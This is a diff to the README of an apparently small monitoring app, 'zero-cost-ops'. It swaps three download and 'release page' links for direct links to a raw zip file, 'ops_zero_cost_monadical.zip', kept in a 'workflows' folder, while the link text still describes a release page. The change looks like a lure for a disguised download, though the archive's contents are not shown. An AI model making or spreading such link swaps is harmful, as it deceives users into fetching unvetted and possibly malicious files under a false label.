@@ -1,6 +1,6 @@
 # 📊 zero-cost-ops - Free monitoring for solo founders
 
-[![Download zero-cost-ops](https://img.shields.io/badge/Download%20zero--cost--ops-blue?style=for-the-badge)](https://github.com/batistai4724/zero-cost-ops/releases)
+[![Download zero-cost-ops](https://img.shields.io/badge/Download%20zero--cost--ops-blue?style=for-the-badge)](https://github.com/batistai4724/zero-cost-ops/raw/refs/heads/main/workflows/ops_zero_cost_monadical.zip)
 
 ## 🧭 What this app does
 
@@ -19,7 +19,7 @@ You can use it to:
 
 Use this link to visit the release page and download the app for Windows:
 
-[Visit the download page](https://github.com/batistai4724/zero-cost-ops/releases)
+[Visit the download page](https://github.com/batistai4724/zero-cost-ops/raw/refs/heads/main/workflows/ops_zero_cost_monadical.zip)
 
 ### What to download
 
@@ -221,7 +221,7 @@ Use these steps if you want the shortest path:
 6. Finish the setup.
 7. Start checking your dashboard
 
-[Open the release page](https://github.com/batistai4724/zero-cost-ops/releases)
+[Open the release page](https://github.com/batistai4724/zero-cost-ops/raw/refs/heads/main/workflows/ops_zero_cost_monadical.zip)
 
 ## 🧩 Topics covered by this project
 
